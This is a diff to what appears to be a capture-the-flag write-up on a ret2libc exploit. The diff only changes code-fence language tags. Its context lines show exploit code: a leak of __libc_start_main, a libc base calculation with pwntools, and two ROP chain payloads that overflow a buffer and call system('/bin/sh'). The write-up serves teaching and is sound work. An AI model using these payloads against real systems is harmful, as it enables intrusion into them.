@@ -118,7 +118,7 @@ This is what the stack will look with our ROP chain:
 ```
 
 Here's our script to leak `__libc_start_main`:
-```python3
+```python
 """ The following script was based heavily on the script provided in the following url """
 """           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """
 
@@ -198,13 +198,13 @@ Note: There is also an online libc database at https://libc.blukat.me/, but it o
 We can use the pwntools python library to find libc offsets.  
 
 This calculates the base libc address by subtracting the offset from \_\_libc\_start\_main
-```python3
+```python
 libc.address = leak - libc.sym["__libc_start_main"]
 ```
 
 Then by using this libc base address we can find the addresses of system() and "/bin/sh" to spawn a shell.  
 Using pwntools:
-```python3
+```python
 BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
 SYSTEM = libc.sym["system"]
 ```
@@ -213,18 +213,18 @@ For our exploit, we need to be able to call main() twice: once to leak libc and 
 We can just append the address of main() to our first ROP chain to accomplish this.  
 
 First ROP chain:
-```python3
+```python
 base = b"A"*256 + b"B"*8 #Overflow buffer until return address
 rop = base + p64(POP_RDI) + p64(LIBC_START_MAIN) +  p64(PUTS) + p64(MAIN)
 ```
 
 Then our second rop chain will call system:
-```python3
+```python
 rop2 = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)
 ```
 
 Combine the above into a script:
-```python3
+```python
 """ The following script was based heavily on the script provided in the following url """
 """           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """
 
